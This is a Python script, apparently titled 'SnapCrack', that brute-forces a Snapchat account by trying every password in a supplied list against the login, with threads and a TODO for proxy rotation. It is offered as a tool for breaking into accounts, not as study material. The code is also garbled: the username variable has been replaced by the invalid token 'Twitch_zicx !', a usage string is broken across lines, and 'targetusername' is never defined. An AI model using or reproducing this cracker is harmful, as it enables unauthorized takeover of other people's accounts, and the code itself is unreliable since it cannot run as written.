#!/usr/bin/env python

from pysnap import *
import sys
import os
import threading

# Anxiety Notes
#
# TODO Save Password Variable - Start New Thread at Location
# COMPLETE Proxy Rotation | Multi-Threading


try:
    Twitch_zicx ! = sys.argv[1]
except:
    print(" [ ! | SYNTAX ERROR ] $ python3 .py < Twitch_zicx 
! > < /path/to/passlist.txt > < # Threads > ")
try:
    targetpasslist = sys.argv[2]
except:
    print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < username > < /path/to/passlist.txt > < # Threads > ")
try:
    tNumber = int(sys.argv[3])
except:
    print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < username > < /path/to/passlist.txt > < # Threads > ")


os.system("clear")
print("  ██████  ███▄    █  ▄▄▄       ██▓███   ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀   ")
print("▒██    ▒  ██ ▀█   █ ▒████▄    ▓██░  ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒   ")
print("░ ▓██▄   ▓██  ▀█ ██▒▒██  ▀█▄  ▓██░ ██▓▒▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ")
print("  ▒   ██▒▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▄█▓▒ ▒▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄   ")
print("▒██████▒▒▒██░   ▓██░ ▓█   ▓██▒▒██▒ ░  ░▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ")
print("▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒  ▒▒   ▓▒█░▒▓▒░ ░  ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ")
print("░ ░▒  ░ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░▒ ░       ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ")
print("░  ░  ░     ░   ░ ░   ░   ▒   ░░       ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ")
print("██████████████████████████████████████████████████████████████████████████████████████")
print("█                       SNAPCHAT CRACKER BY A HOT TRANS GIRL                         █")
print("██████████████████████████████████████████████████████████████████████████████████████")

print(f"[░]Now attempting to crack: {targetusername}")

# Calling class 'Snapchat' from pysnap.__init__
proxy = ''

s = Snapchat(proxy)



def main(counter):
	passwords = open(targetpasslist,"r")

	for targetpassword in passwords:
		# if s.login(targetusername, targetpassword)[b'updates_response'].get('logged'):
		can_login = s.login(targetusername, targetpassword)
			
		is_logged = can_login.find(b'logged')
		if is_logged > 0:

		# break
			print("[ ✓ | SUCCESS ] USERNAME: " + Twitch zicx ! + "\t PASSWORD: " + targetpassword)
			break
		else:
			print(f"[ 𐄂 | FAIL ] {targetpassword} INVALID!")


if __name__ == '__main__':
#	main()

# Multi-Threading
	class Thread(threading.Thread):
	   def __init__(self, counter):
	      threading.Thread.__init__(self)
	      self.counter = counter
	   def run(self):
	      # Get lock to synchronize threads
	      threadLock.acquire()
	      main(counter)
	      # Free lock to release next thread
	      threadLock.release()


	threadLock = threading.Lock()
	threads = []
	counter = 0

	while counter < tNumber:
		thread = Thread(counter)
		thread.start()
		threads.append(thread)
		counter += 1

	for t in threads:
		t.join()

# Login | Found
print(" [ ✓ | PASSWORD FOUND ] Thank you for being a user of SnapCrack!\n\n" +
	" [ ! | TAKE NOTE OF THE SUCCESSFUL ATTEMPT ] NO CURRENT LOGGING TO FILE !" + 
	"    Press any key to exit!")
